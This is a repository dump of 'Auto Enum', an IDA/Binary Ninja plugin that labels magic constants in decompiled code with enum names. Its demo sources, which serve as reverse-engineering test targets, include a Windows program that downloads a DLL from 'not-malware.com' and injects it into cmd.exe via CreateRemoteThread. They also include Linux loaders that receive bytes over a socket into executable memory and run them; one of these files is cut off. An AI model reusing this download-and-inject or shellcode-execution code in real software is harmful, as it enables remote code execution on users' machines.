Project Path: arc_junron_auto-enum_o0okb4p3

Source Tree:

```txt
arc_junron_auto-enum_o0okb4p3
├── LICENSE
├── README.md
├── binjastub
│   ├── README.md
│   ├── __init__.py
│   └── plugin.json
├── demo
│   ├── demo
│   ├── demo-win.cpp
│   ├── demo.c
│   ├── demo2
│   └── demo2.c
├── gen
│   ├── diff.py
│   ├── linux
│   │   ├── README.md
│   │   ├── compress.py
│   │   ├── extra_enums.json
│   │   ├── main.py
│   │   ├── overrides.py
│   │   ├── parse_manpages.py
│   │   ├── resolve.py
│   │   └── strace.json
│   └── windows
│       ├── README.md
│       ├── main.py
│       ├── msdn_enums.py
│       └── win32enums.py
└── plugin
    ├── auto_enum.py
    ├── enumlib
    │   ├── __init__.py
    │   ├── data
    │   │   ├── linux
    │   │   │   ├── enums.json
    │   │   │   ├── functions
    │   │           ├── CreateWindowEx.json
    │   │           ├── CryptAcquireContext.json
    │   │           ├── CryptBinaryToString.json
    │   │           ├── CryptCreateHash.json
    │   │           ├── CryptDecodeObjectEx.json
    │   │           ├── CryptDecrypt.json
    │   │           ├── CryptDeriveKey.json
    │   │           ├── CryptEncodeObjectEx.json
    │   │           ├── CryptEncrypt.json
    │   │           ├── CryptExportKey.json
    │   │           ├── CryptExportPublicKeyInfoFromBCryptKeyHandle.json
    │   │           ├── CryptFindOIDInfo.json
    │   │           ├── CryptFormatObject.json
    │   │           ├── CryptGenKey.json
    │   │           ├── CryptGetDefaultProvider.json
    │   │           ├── CryptGetHashParam.json
    │   │           ├── CryptGetKeyParam.json
    │   │           ├── CryptGetProvParam.json
    │   │           ├── CryptGetTimeValidObject.json
    │   │           ├── CryptHashCertificate.json
    │   │           ├── CryptHashData.json
    │   │           ├── CryptHashPublicKeyInfo.json
    │   │           ├── CryptHashSessionKey.json
    │   │           ├── CryptImportPublicKeyInfoEx.json
    │   │           ├── CryptMsgControl.json
    │   │           ├── CryptSetKeyParam.json
    │   │           ├── CryptSetProvParam.json
    │   │           ├── CryptSetProviderEx.json
    │   │           ├── CryptSignHash.json
    │   │           ├── CryptVerifyCertificateSignatureEx.json
    │   │           ├── CryptVerifySignature.json
    │   │           ├── DeferWindowPos.json
    │   │           ├── DefineDosDevice.json
    │   │           ├── DeleteMenu.json
    │   │           ├── DrawIconEx.json
    │   │           ├── EnableMenuItem.json
    │   │           ├── EnumDependentServices.json
    │   │           ├── EnumServicesStatus.json
    │   │           ├── EnumServicesStatusEx.json
    │   │           ├── EraseTape.json
    │   │           ├── EscapeCommFunction.json
    │   │           ├── ExitWindowsEx.json
    │   │           ├── FindFirstChangeNotification.json
    │   │           ├── FormatMessage.json
    │   │           ├── GetAddrInfoEx.json
    │   │           ├── GetAncestor.json
    │   │           ├── GetAsyncKeyState.json
    │   │           ├── GetFinalPathNameByHandle.json
    │   │           ├── GetGuiResources.json
    │   │           ├── GetKeyNameText.json
    │   │           ├── GetMenuDefaultItem.json
    │   │           ├── GetMenuState.json
    │   │           ├── GetMenuString.json
    │   │           ├── GetMessage.json
    │   │           ├── GetMouseMovePointsEx.json
    │   │           ├── GetNextWindow.json
    │   │           ├── GetPriorityClipboardFormat.json
    │   │           ├── GetProcessId.json
    │   │           ├── GetProcessIdOfThread.json
    │   │           ├── GetRawInputData.json
    │   │           ├── GetRawInputDeviceInfo.json
    │   │           ├── GetSysColor.json
    │   │           ├── GetSystemMetrics.json
    │   │           ├── GetTapeParameters.json
    │   │           ├── GetTapePosition.json
    │   │           ├── GetThreadId.json
    │   │           ├── GetUserObjectInformation.json
    │   │           ├── GetWindow.json
    │   │           ├── GetWindowLong.json
    │   │           ├── GetWindowLongPtr.json
    │   │           ├── GlobalAlloc.json
    │   │           ├── GlobalReAlloc.json
    │   │           ├── HiliteMenuItem.json
    │   │           ├── HttpReceiveClientCertificate.json
    │   │           ├── InetNtop.json
    │   │           ├── InetPton.json
    │   │           ├── InsertMenu.json
    │   │           ├── InternetAutodial.json
    │   │           ├── IsClipboardFormatAvailable.json
    │   │           ├── IsProcessorFeaturePresent.json
    │   │           ├── LoadKeyboardLayout.json
    │   │           ├── LocalAlloc.json
    │   │           ├── LocalReAlloc.json
    │   │           ├── LockSetForegroundWindow.json
    │   │           ├── LookupIconIdFromDirectoryEx.json
    │   │           ├── MapViewOfFile3.json
    │   │           ├── MapViewOfFile3FromApp.json
    │   │           ├── MapViewOfFileExNuma.json
    │   │           ├── MapVirtualKey.json
    │   │           ├── MapVirtualKeyEx.json
    │   │           ├── MessageBeep.json
    │   │           ├── MessageBox.json
    │   │           ├── ModifyMenu.json
    │   │           ├── MonitorFromPoint.json
    │   │           ├── MoveFileEx.json
    │   │           ├── MoveFileTransacted.json
    │   │           ├── MsgWaitForMultipleObjectsEx.json
    │   │           ├── NotifyServiceStatusChange.json
    │   │           ├── NotifyWinEvent.json
    │   │           ├── OpenCommPort.json
    │   │           ├── OpenDesktop.json
    │   │           ├── OpenEncryptedFileRaw.json
    │   │           ├── OpenFile.json
    │   │           ├── OpenFileById.json
    │   │           ├── OpenInputDesktop.json
    │   │           ├── OpenJobObject.json
    │   │           ├── OpenProcess.json
    │   │           ├── OpenThread.json
    │   │           ├── OpenWindowStation.json
    │   │           ├── PFXExportCertStoreEx.json
    │   │           ├── PFXImportCertStore.json
    │   │           ├── PeekMessage.json
    │   │           ├── PrepareTape.json
    │   │           ├── PurgeComm.json
    │   │           ├── QueryDisplayConfig.json
    │   │           ├── QueryFullProcessImageName.json
    │   │           ├── QueryServiceConfig2.json
    │   │           ├── ReOpenFile.json
    │   │           ├── ReadDirectoryChanges.json
    │   │           ├── ReadDirectoryChangesEx.json
    │   │           ├── ReadEventLog.json
    │   │           ├── ReadThreadProfilingData.json
    │   │           ├── RegisterApplicationRestart.json
    │   │           ├── RegisterDeviceNotification.json
    │   │           ├── RegisterHotKey.json
    │   │           ├── RegisterPowerSettingNotification.json
    │   │           ├── RegisterWaitForSingleObject.json
    │   │           ├── RemoveMenu.json
    │   │           ├── ReportEvent.json
    │   │           ├── RequestWakeupLatency.json
    │   │           ├── ScrollWindow.json
    │   │           ├── SendMessageTimeout.json
    │   │           ├── SetClipboardData.json
    │   │           ├── SetCoalescableTimer.json
    │   │           ├── SetCommMask.json
    │   │           ├── SetDisplayConfig.json
    │   │           ├── SetFileAttributes.json
    │   │           ├── SetFileAttributesTransacted.json
    │   │           ├── SetFileCompletionNotificationModes.json
    │   │           ├── SetFilePointer.json
    │   │           ├── SetFilePointerEx.json
    │   │           ├── SetFirmwareEnvironmentVariableEx.json
    │   │           ├── SetLayeredWindowAttributes.json
    │   │           ├── SetMenuItemBitmaps.json
    │   │           ├── SetPriorityClass.json
    │   │           ├── SetProcessDEPPolicy.json
    │   │           ├── SetProcessDefaultLayout.json
    │   │           ├── SetProcessShutdownParameters.json
    │   │           ├── SetProcessValidCallTargets.json
    │   │           ├── SetProcessWorkingSetSizeEx.json
    │   │           ├── SetSearchPathMode.json
    │   │           ├── SetSystemFileCacheSize.json
    │   │           ├── SetTapeParameters.json
    │   │           ├── SetTapePosition.json
    │   │           ├── SetThreadExecutionState.json
    │   │           ├── SetThreadPriority.json
    │   │           ├── SetUserObjectInformation.json
    │   │           ├── SetWinEventHook.json
    │   │           ├── SetWindowDisplayAffinity.json
    │   │           ├── SetWindowLong.json
    │   │           ├── SetWindowLongPtr.json
    │   │           ├── SetWindowPos.json
    │   │           ├── SetWindowsHookEx.json
    │   │           ├── SystemParametersInfo.json
    │   │           ├── TileWindows.json
    │   │           ├── ToAscii.json
    │   │           ├── ToAsciiEx.json
    │   │           ├── ToUnicode.json
    │   │           ├── ToUnicodeEx.json
    │   │           ├── TrackPopupMenu.json
    │   │           ├── TrackPopupMenuEx.json
    │   │           ├── UnmapViewOfFile2.json
    │   │           ├── UnmapViewOfFileEx.json
    │   │           ├── UpdateLayeredWindow.json
    │   │           ├── VerifyVersionInfo.json
    │   │           ├── VirtualAlloc.json
    │   │           ├── VirtualAlloc2.json
    │   │           ├── VirtualAlloc2FromApp.json
    │   │           ├── VirtualAllocEx.json
    │   │           ├── VirtualAllocExNuma.json
    │   │           ├── VirtualAllocFromApp.json
    │   │           ├── VirtualFree.json
    │   │           ├── VirtualFreeEx.json
    │   │           ├── VirtualProtect.json
    │   │           ├── VirtualProtectEx.json
    │   │           ├── VirtualProtectFromApp.json
    │   │           ├── WSALookupServiceBegin.json
    │   │           ├── WSALookupServiceNext.json
    │   │           ├── WSASocket.json
    │   │           ├── WaitNamedPipe.json
    │   │           ├── WinHttpResetAutoProxy.json
    │   │           ├── WriteTapemark.json
    │   │           ├── getsockopt.json
    │   │           ├── shutdown.json
    │   │           └── socket.json
    │   ├── scripts
    │   │   └── apply_to_til.py
    │   └── ui_plugins
    │       ├── binja_plugin.py
    │       └── ida_plugin.py
    └── ida-plugin.json

```

`LICENSE`:

```
MIT License

Copyright (c) 2024 Lam Jun Rong

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
# Auto Enum
IDA/Binary Ninja Plugin to automatically identify and set enums for standard functions

## Demo

### Linux

https://github.com/junron/auto-enum/assets/26194273/9e43f3ec-0722-4388-951a-b90bec5ab19b


See [`demo.c`](./demo/demo.c) for the source code.

### Windows


https://github.com/junron/auto-enum/assets/26194273/0c6a0f69-b9c0-42ea-b97b-5848b6f7c3a1

See [`demo-win.cpp`](./demo/demo-win.cpp) for the source code.


## Plugin Installation

Copy `plugin/*` to your IDA/Binary Ninja Plugin directory. No dependencies required.

## TIL patching for IDA

Auto-enum can be integrated directly into the type library (TIL) files, allowing for enum loading without the plugin's installation. However, per-call analysis will only be available if the plugin is installed.

To modify the TIL files, run the following commands in the `plugin/enumlib/scripts` directory:
```shell
# Generate for linux
python3 apply_to_til.py --platform linux --overwrite
# Generate for Windows
python3 apply_to_til.py --platform windows --overwrite
```
Note that you must have IDA Pro 9 installed, with `idalib` activated.   

As the TIL files installed with IDA will be modified, ensure that you have a backup of the `til` directory, as well as sufficient permissions to modify files in the IDA installation directory.
```

`binjastub/README.md`:

```md
# Auto Enum

![binja_demo](https://files.junron.dev/binja_demo.gif)

## Overview

Decompiled C code often contains "magic" constants that represent flags or options.
```c
int64_t buf = mmap(0, 0x1000, 7, 0x22, 0xffffffff, 0);
```

Auto Enum detects and demystifies these constants, converting them to human-readable symbols.

```c
int64_t buf = mmap(
    0,
    0x1000,
    PROT_WRITE | PROT_EXEC | PROT_READ,
    MAP_PRIVATE | MAP_ANON | MAP_FILE,
    0xffffffff, 0
);
```

Check out the [README](https://github.com/junron/auto-enum) on GitHub for more info!
```

`binjastub/__init__.py`:

```py
import os
import sys

lh_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "..", "plugin")
sys.path.append(lh_path)

import binaryninja as bn
from enumlib.ui_plugins.binja_plugin import auto_enum
bn.PluginCommand.register("Auto Enum", "Automatically detect standard enums", auto_enum)
```

`binjastub/plugin.json`:

```json
{
    "api": [
        "python3"
    ],
    "author": "Lam Jun Rong",
    "description": "Automatically set enums for standard functions",
    "license": {
        "name": "MIT",
        "text": "Copyright (c) 2024 Lam Jun Rong\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE."
    },
    "longdescription": "",
    "minimumbinaryninjaversion": 4526,
    "name": "Auto Enum",
    "platforms": [
        "Darwin",
        "Linux",
        "Windows"
    ],
    "pluginmetadataversion": 2,
    "type": [
        "helper"
    ],
    "version": "0.1.1"
}
```

`demo/demo-win.cpp`:

```cpp
#include <windows.h>
#include <wininet.h>
#include <cstdio>

#pragma comment(lib,"wininet")


int main(int argc, char* argv[])
{
    HINTERNET hInternetSession;
    HINTERNET hURL;
    BOOL bResult;
    DWORD dwBytesRead = 1;

    // Make internet connection.
    hInternetSession = InternetOpen(
        L"notmalware", // agent
        INTERNET_OPEN_TYPE_PRECONFIG,  // access
        NULL, NULL, 0);                // defaults

    // Make connection to desired page.
    hURL = InternetOpenUrl(
        hInternetSession,                       // session handle
        L"http://not-malware.com:8000/Dll1.dll",  // URL to access
        NULL, 0, 0, 0);                         // defaults

    // Read page into memory buffer.

    char buf[1024];

    DWORD dwTemp;
    HANDLE hFile = CreateFile(L"Dll1.dll", GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (INVALID_HANDLE_VALUE == hFile) {
        return 0;
    }

    for (;dwBytesRead > 0;)
    {
        InternetReadFile(hURL, buf, (DWORD)sizeof(buf), &dwBytesRead);
        WriteFile(hFile, buf, dwBytesRead, &dwTemp, NULL);
    }

    CloseHandle(hFile);
    STARTUPINFOA SI;
    PROCESS_INFORMATION PI;

    ZeroMemory(&SI, sizeof(SI));
    SI.cb = sizeof(SI);
    ZeroMemory(&PI, sizeof(PI));

    CreateProcessA("C:\\Windows\\System32\\cmd.exe", nullptr, nullptr, nullptr, TRUE, CREATE_NEW_CONSOLE , nullptr, nullptr, &SI, &PI);
    
    memset(buf, 0, 0x200);
    GetCurrentDirectoryA(0x200, buf);
    strncat_s(buf, "\\Dll1.dll", 10);


    LPVOID pDllPath = VirtualAllocEx(PI.hProcess, 0, 0x200, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(PI.hProcess, pDllPath, (LPVOID)buf, strlen(buf) + 1, 0);
  
    HANDLE hLoadThread = CreateRemoteThread(PI.hProcess, 0, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);

    WaitForSingleObject(hLoadThread, INFINITE); // Wait for the execution of our loader thread to finish

    VirtualFreeEx(PI.hProcess, pDllPath, 0, MEM_RELEASE); // Free the memory allocated for our dll path

    return 0;
}
```

`demo/demo.c`:

```c
#include <stdio.h>
#include <seccomp.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <seccomp.h>
#include <stddef.h>
#include<sys/socket.h>
#include<arpa/inet.h>


struct sock_filter filter[] = {
    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),
    BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_read, 1, 0),
    BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_write, 0, 1),
    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
};

struct sock_fprog prog = {
    .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
    .filter = filter,
};

struct sockaddr_in server = {
    .sin_family = AF_INET,
    .sin_addr.s_addr = INADDR_ANY,
    .sin_port = 14597,
};
int main() {
    void* region = mmap(NULL, 
			0x1000,
			PROT_WRITE | PROT_EXEC | PROT_READ,
			MAP_ANONYMOUS | MAP_PRIVATE,
			-1,
			0);

    int socket_desc , client_sock , c;
    struct sockaddr_in client;
     
    //Create socket
    socket_desc = socket(AF_INET , SOCK_STREAM , 0);
    if (socket_desc == -1)
    {
        return 1;
    }
     
    //Bind
    if( bind(socket_desc,(struct sockaddr *)&server , sizeof(server)) < 0)
    {
        return 1;
    }
     
    listen(socket_desc , 3);
     
    c = sizeof(struct sockaddr_in);
	
    client_sock = accept(socket_desc, (struct sockaddr *)&client, (socklen_t*)&c);

    int recv_len = recv(client_sock, region, 0x1000, 0);
    printf("Received %d bytes!\n", recv_len);

    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
        return 1;
    }
    if (prctl(PR_SET_SECCOMP, 2, &prog)) {
        return 1;
    }

    ((int(*)())region)();

    return 0;
}
```

`demo/demo2.c`:

```c
#include <stdio.h>
#include <seccomp.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/stat.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <seccomp.h>
#include <stddef.h>
#include<sys/socket.h>
#include<arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <string.h>


struct sock_filter filter[] = {
    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),
    BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_read, 1, 0),
    BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_write, 0, 1),
    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
};

struct sock_fprog prog = {
    .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
    .filter = filter,
};

struct sockaddr_in server = {
    .sin_family = AF_INET,
    .sin_addr.s_addr = 0x1000007f,
    .sin_port = 14597,
};


struct ifreq ifr;
char *interface = "eth0";

int main() {
    int socket_desc , pid, fd;
    struct sockaddr_in client;
     
    //Create socket
    socket_desc = socket(AF_INET , SOCK_STREAM , 0);

    connect(socket_desc, &server, sizeof(struct sockaddr_in));

    int yes = 1;
